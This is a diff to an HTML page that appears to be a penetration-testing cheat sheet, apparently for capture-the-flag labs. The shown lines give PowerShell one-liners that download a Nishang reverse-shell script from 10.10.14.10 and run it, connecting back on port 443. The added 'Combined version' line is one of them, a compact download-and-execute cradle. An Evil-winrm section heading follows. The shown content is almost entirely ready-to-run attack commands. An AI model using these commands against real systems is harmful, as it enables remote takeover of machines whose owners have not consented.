@@ -71,6 +71,9 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c"># Short version</span>
 </span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.10/rev.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">10</span> <span class="n">-Port</span> <span class="mf">443</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Combined version</span>
+</span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="n">iwr</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.10/rev.ps1&#39;</span><span class="p">)</span>
 </span></span></code></pre></div><p><small><em>Note: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">rev.ps1</a></em></small></p>
 <hr>
 <h3 id="evil-winrm">Evil-winrm</h3>
